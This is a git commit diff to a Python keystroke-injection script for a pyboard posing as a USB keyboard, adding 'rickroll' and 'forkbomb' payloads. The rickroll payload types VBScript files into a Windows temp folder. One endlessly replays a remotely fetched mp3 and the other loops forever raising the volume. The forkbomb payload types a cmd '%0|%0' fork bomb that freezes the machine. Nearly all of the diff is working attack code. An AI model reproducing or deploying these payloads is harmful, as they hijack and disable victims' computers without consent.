80a1ba475d4690b0952a0688023fa99f14dbbfdc
ekohilas <ekohilas@users.noreply.github.com>
2017-05-28 21:48:48 +1000

    rickroll and forkbomb

--- translator.py
+++ translator.py
@@ -6,6 +6,11 @@ LINUX_TERMINAL = bytearray(8)
 LINUX_TERMINAL[0], LINUX_TERMINAL[2] = MODS["LCTRL"] + MODS["LALT"], KEYS["t"]
 CHANGE_WINDOW = bytearray(8)
 CHANGE_WINDOW[0], CHANGE_WINDOW[2] = MODS["LALT"], KEYS["TAB"]
+CTRL_Z = bytearray(8)
+CTRL_Z[0], CTRL_Z[2] = MODS["LCTRL"], KEYS["z"]
+LALT_F4 = bytearray(8)
+LALT_F4[0], LALT_F4[2] = MODS["LALT"], KEYS["F4"]
+
 
 def windows_terminal():
     run = bytearray(8)
@@ -60,14 +65,47 @@ def send_string(string):
         else:
             char = ""
 
+def rickroll():
+    windows_terminal()
+    pyb.delay(500)
+    script_1 = """cd %tmp% && copy con /Y rickyou.vbs
+While true
+Dim oPlayer
+Set oPlayer = CreateObject("WMPlayer.OCX")
+oPlayer.URL = "https://pixelcoding.nl/download/rickroll.mp3"
+oPlayer.controls.play
+While oPlayer.playState <> 1 ' 1 = Stopped
+WScript.Sleep 100
+Wend
+oPlayer.close
+Wend
+"""
+    string = "\\ENTER\\".join(script_1.splitlines())
+    send_string(string)
+    send_array(CTRL_Z)
+    send_string("\\ENTER\\")
+    script_2 = """copy con /Y volup.vbs
+do
+Set WshShell = CreateObject("WScript.Shell")
+WshShell.SendKeys(chr(&hAF))
+loop
+"""
+    string = "\\ENTER\\".join(script_2.splitlines())
+    send_string(string)
+    send_array(CTRL_Z)
+    send_string("\\ENTER\\")
+    send_string("start rickyou.vbs && volup.vbs\\ENTER\\exit\\ENTER\\")
+
+def forkbomb():
+    windows_terminal()
+    pyb.delay(500)
+    send_string("cmd /C '%0|%0'\\ENTER\\")
+
 if __name__ == "__main__":
     while True:
         if pyb.Switch()():
-            if os_name == "nt":
-
-            else:
-                send_array(LINUX_TERMINAL)
-                #send_array(CHANGE_WINDOW)
-                pyb.delay(500)
-                send_string("echo 'hello world!'\\ENTER\\")
+            #send_array(LINUX_TERMINAL)
+            #send_array(CHANGE_WINDOW)
+            #pyb.delay(1000)
+            rickroll()
 
